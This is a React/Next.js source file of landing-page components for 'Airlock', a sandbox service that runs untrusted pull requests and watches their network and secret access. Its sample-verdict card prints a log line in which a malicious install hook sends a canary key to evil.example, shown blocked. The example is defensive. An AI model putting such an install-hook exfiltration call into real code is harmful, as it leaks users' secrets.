"use client";

import Link from "next/link";
import { useEffect, useState } from "react";
import { api, type LiveStats } from "@/lib/api";
import { Card } from "@/components/ui";
import {
  IconArrowRight,
  IconBan,
  IconCheck,
  IconFileBan,
  IconGauge,
  IconGlobe,
  IconKey,
  IconShieldAlert,
  IconShieldCheck,
  IconSpinner,
  IconTriangleAlert,
} from "@/components/Icons";
import { CountUp, Reveal } from "@/components/motion";

const STEPS = [
  { icon: <IconGlobe />, label: "Fetch PR", sub: "public diff + deps" },
  { icon: <IconShieldAlert />, label: "Pre-flight", sub: "OSV malware, injection, risk" },
  { icon: <IconCheck />, label: "Plan", sub: "fixed before untrusted output" },
  { icon: <IconSpinner />, label: "Detonate", sub: "2 gVisor sandboxes, base vs PR" },
  { icon: <IconTriangleAlert />, label: "Prove", sub: "generated tests, kept only if they run" },
  { icon: <IconKey />, label: "Observe", sub: "egress, canaries, writes, limits" },
  { icon: <IconShieldCheck />, label: "Decide", sub: "rule table — never the model" },
  { icon: <IconBan />, label: "Destroy", sub: "guaranteed cleanup" },
];

export function PipelineFlow() {
  return (
    <Reveal>
      <section aria-label="How a review runs">
        <h2 className="mb-2 text-center text-2xl font-bold tracking-tight">
          Eight steps between a stranger&apos;s PR and your merge button
        </h2>
        <p className="mx-auto mb-8 max-w-2xl text-center text-sm text-muted">
          The code owns the flow; the model only writes prose. Every step is a receipt in the
          trace.
        </p>
        <ol className="grid grid-cols-2 gap-3 sm:grid-cols-4">
          {STEPS.map((s, i) => (
            <li key={s.label}>
              <div className="lift flex h-full flex-col gap-2 card-shadow rounded-2xl border border-line bg-surface p-4 hover:border-line-strong">
                <div className="flex items-center gap-2">
                  <span className="text-primary">{s.icon}</span>
                  <span className="font-mono text-xs text-muted">{String(i + 1).padStart(2, "0")}</span>
                </div>
                <div className="text-sm font-semibold">{s.label}</div>
                <div className="text-xs text-muted">{s.sub}</div>
              </div>
            </li>
          ))}
        </ol>
      </section>
    </Reveal>
  );
}

const ROWS: Array<{ capability: string; airlock: boolean | "risk"; others: string }> = [
  { capability: "Runs the PR's own code", airlock: true, others: "AI reviewers read the diff; scanners stay static" },
  { capability: "Safe for untrusted forks", airlock: true, others: "CI runs it with your secrets (\"pwn requests\")" },
  { capability: "Watches behaviour — network, secrets, files", airlock: true, others: "Nobody records what the code did" },
  { capability: "Verdict backed by receipts", airlock: true, others: "Findings without proof, or raw logs" },
  { capability: "Same review on every push, via a scoped API key", airlock: true, others: "Manual spot checks, or static scans only" },
];

export function ComparisonTable() {
  return (
    <Reveal>
      <section aria-label="Why Airlock is different">
        <h2 className="mb-2 text-center text-2xl font-bold tracking-tight">Why this is different</h2>
        <p className="mx-auto mb-8 max-w-2xl text-center text-sm text-muted">
          Every existing option covers one slice. Airlock is the only one that executes the PR
          safely, watches what it does, and proves the result.
        </p>
        <Card className="overflow-x-auto p-0!">
          <table className="w-full min-w-[640px] text-left text-sm">
            <thead>
              <tr className="border-b border-line">
                <th className="px-4 py-3 font-medium text-muted">Capability</th>
                <th className="px-4 py-3 font-semibold">
                  <span className="inline-flex items-center gap-1.5">
                    <IconShieldCheck width={15} height={15} className="text-success" />
                    Airlock
                  </span>
                </th>
                <th className="px-4 py-3 font-medium text-muted">Everything else today</th>
              </tr>
            </thead>
            <tbody>
              {ROWS.map((r) => (
                <tr key={r.capability} className="border-b border-line last:border-0">
                  <td className="px-4 py-3 font-medium">{r.capability}</td>
                  <td className="px-4 py-3">
                    <span className="inline-flex items-center gap-1.5 text-success">
                      <IconCheck width={15} height={15} />
                      yes, proven
                    </span>
                  </td>
                  <td className="px-4 py-3 text-muted">{r.others}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </Card>
      </section>
    </Reveal>
  );
}

/** Live value card: real numbers from the running instance, refreshed with the console. */
export function LiveValueCard() {
  const [stats, setStats] = useState<LiveStats | null>(null);

  useEffect(() => {
    api
      .stats()
      .then(setStats)
      .catch(() => setStats(null));
    const id = window.setInterval(() => {
      api
        .stats()
        .then(setStats)
        .catch(() => undefined);
    }, 5000);
    return () => window.clearInterval(id);
  }, []);

  return (
    <Reveal delay={120} className="flex-1">
      <Card className="grad-border flex h-full flex-col justify-center">
        <div className="flex items-center justify-between gap-2">
          <h2 className="text-base font-semibold">Measured, not claimed</h2>
          <span className="inline-flex items-center gap-1.5 text-xs text-muted">
            <span
              className={`inline-block h-1.5 w-1.5 rounded-full ${stats ? "live-dot bg-success" : "bg-line-strong"}`}
            />
            {stats ? "live" : "offline"}
          </span>
        </div>
        <p className="mt-1 text-sm text-muted">
          These numbers come from the instance serving this page — updated live.
        </p>
        <div className="mt-4 grid grid-cols-3 gap-2 text-center">
          <div>
            <div className="text-2xl font-bold text-grad-a">
              <CountUp value={stats?.attacks_contained ?? 0} duration={600} />
            </div>
            <div className="text-xs text-muted">attacks contained</div>
          </div>
          <div>
            <div className="text-2xl font-bold text-grad-b">
              <CountUp value={stats?.runs_completed ?? 0} duration={600} />
            </div>
            <div className="text-xs text-muted">runs completed</div>
          </div>
          <div>
            <div className="text-2xl font-bold text-grad-c">
              <CountUp value={stats?.avg_tokens_per_run ?? 0} duration={600} />
            </div>
            <div className="text-xs text-muted">avg tokens / run</div>
          </div>
        </div>
        {stats && stats.runs_completed === 0 ? (
          <p className="mt-3 text-center text-xs text-muted">
            No runs yet on this instance — start a run below and watch these move.
          </p>
        ) : null}
        <Link
          href="/console"
          className="mt-4 inline-flex items-center gap-1.5 text-sm font-semibold text-primary hover:underline"
        >
          Open the dashboard
          <IconArrowRight width={14} height={14} />
        </Link>
      </Card>
    </Reveal>
  );
}

/** A real recorded run (dummy mode), rendered as it appears in the run view. */
export function SampleVerdict() {
  return (
    <Reveal className="h-full">
      <Card className="grad-border flex h-full flex-col border-danger-line/60">
        <div className="mb-4 flex flex-wrap items-center justify-between gap-2">
          <span className="inline-flex items-center gap-2 rounded-lg border border-danger-line bg-danger-badge px-3 py-1.5 text-sm font-bold text-danger-text">
            <IconShieldAlert />
            Suspicious — human review
          </span>
          <span className="text-xs text-muted">recorded run · all 12 tests passed</span>
        </div>
        <p className="text-sm text-muted">
          A PR adds an install hook. The test suite is green — a normal reviewer merges it. The
          sandbox watched what the code <em>did</em>:
        </p>
        <div className="mt-4 grid grid-cols-3 gap-2 text-center">
          <div className="rounded-lg border border-danger-line bg-danger-badge p-2.5">
            <div className="text-xl font-bold text-danger-text">1</div>
            <div className="text-xs text-danger-text">network call blocked</div>
          </div>
          <div className="rounded-lg border border-danger-line bg-danger-badge p-2.5">
            <div className="text-xl font-bold text-danger-text">1</div>
            <div className="text-xs text-danger-text">canary key touched</div>
          </div>
          <div className="rounded-lg border border-line bg-surface-2 p-2.5">
            <div className="text-xl font-bold">0</div>
            <div className="text-xs text-muted">host incidents</div>
          </div>
        </div>
        <pre className="mt-4 overflow-x-auto rounded-lg border border-line bg-surface-2 p-3 font-mono text-xs leading-5 text-muted">
{`$ pip install -r requirements.txt
postinstall: http://evil.example/upload?key=[CANARY]
curl: (6) Could not resolve host: evil.example   ← blocked`}
        </pre>
        <p className="mt-auto flex items-center gap-1.5 pt-4 text-xs text-muted">
          <IconFileBan width={13} height={13} />
          Every claim links to the command and output that proved it — no model opinions.
        </p>
      </Card>
    </Reveal>
  );
}

export function StatBand() {
  const stats = [
    // Honest labels: 8 of the 17 library cases are attacks; tests run
    // locally, CI lands with the repo.
    { value: 8, suffix: "/8", label: "attack cases caught (17-case library)" },
    // Keep in sync with the suite — bump when tests are added.
    { value: 92, suffix: "", label: "tests green" },
    { value: 5, suffix: "", label: "agents, code-owned" },
    { value: 2, suffix: "", label: "sandboxes per run" },
  ];
  return (
    <Reveal>
      <div className="grid grid-cols-2 gap-3 sm:grid-cols-4 lg:grid-cols-2">
        {stats.map((s) => (
          <div
            key={s.label}
            className="lift flex flex-col items-center justify-center card-shadow rounded-2xl border border-line bg-surface px-3 py-4 text-center hover:border-line-strong"
          >
            <div className="text-2xl font-bold tracking-tight text-primary tabular-nums">
              <CountUp value={s.value} suffix={s.suffix} />
            </div>
            <div className="mt-1 text-xs text-muted">{s.label}</div>
          </div>
        ))}
      </div>
    </Reveal>
  );
}

/** Team automation: scoped key → CI workflow → every push reviewed (matches the hero copy). */
export function AutomateBand() {
  const steps = [
    {
      icon: <IconKey />,
      title: "Create a scoped team key",
      body: "An admin issues a runs:write key from Dashboard → Automate. Stored hashed, shown once, revocable any time.",
    },
    {
      icon: <IconSpinner />,
      title: "Add one workflow to CI",
      body: "Copy the example from deploy/examples — each push or PR is submitted with a single POST /v1/runs.",
    },
    {
      icon: <IconShieldAlert />,
      title: "Every push gets the same review",
      body: "Verdict, receipts and network anomalies — a push that phones home fails even with green tests.",
    },
  ];
  return (
    <section aria-label="Automate with CI">
      <Reveal>
        <h2 className="mb-2 text-center text-2xl font-bold tracking-tight">Put it on every push</h2>
        <p className="mx-auto mb-8 max-w-2xl text-center text-sm text-muted">
          Your team wires Airlock into CI once. Team keys only ever see their own runs, and real
          credentials never enter a sandbox.
        </p>
      </Reveal>
      <ol className="grid gap-3 sm:grid-cols-3">
        {steps.map((s, i) => (
          <Reveal key={s.title} delay={i * 70}>
            <li className="lift card-shadow flex h-full flex-col gap-2 rounded-2xl border border-line bg-surface p-5 hover:border-line-strong">
              <div className="flex items-center gap-2">
                <span className="text-primary">{s.icon}</span>
                <span className="font-mono text-xs text-muted">{String(i + 1).padStart(2, "0")}</span>
              </div>
              <div className="text-sm font-semibold">{s.title}</div>
              <p className="text-sm text-muted">{s.body}</p>
            </li>
          </Reveal>
        ))}
      </ol>
      <Reveal>
        <p className="mt-4 text-center text-sm">
          <Link href="/console" className="inline-flex items-center gap-1.5 font-semibold text-primary hover:underline">
            Set it up in Dashboard → Automate
            <IconArrowRight width={14} height={14} />
          </Link>
        </p>
      </Reveal>
    </section>
  );
}

export function ContainmentBento() {
  const items = [
    {
      icon: <IconShieldCheck />,
      title: "Isolated execution",
      body: "PR code runs in a throwaway gVisor container on Vultr — never in the app, never on the host.",
    },
    {
      icon: <IconGlobe />,
      title: "Registry-only egress",
      body: "Installs reach package registries only; tests get no network at all. Every attempt is logged and shown.",
    },
    {
      icon: <IconKey />,
      title: "Canary secrets",
      body: "Only fake keys exist inside the sandbox. If code tries to leak one, Airlock catches it red-handed.",
    },
    {
      icon: <IconGauge />,
      title: "Hard caps, then destroy",
      body: "Time, memory and process limits on every command. Sandboxes are destroyed no matter how the run ends.",
    },
  ];
  return (
    <div className="grid gap-3 sm:grid-cols-2">
      {items.map((c, i) => (
        <Reveal key={c.title} delay={i * 70}>
          <div className="lift h-full card-shadow rounded-2xl border border-line bg-surface p-5 hover:border-line-strong">
            <div className="flex items-center gap-2 font-semibold">
              <span className="text-primary">{c.icon}</span>
              {c.title}
            </div>
            <p className="mt-2 text-sm text-muted">{c.body}</p>
          </div>
        </Reveal>
      ))}
    </div>
  );
}
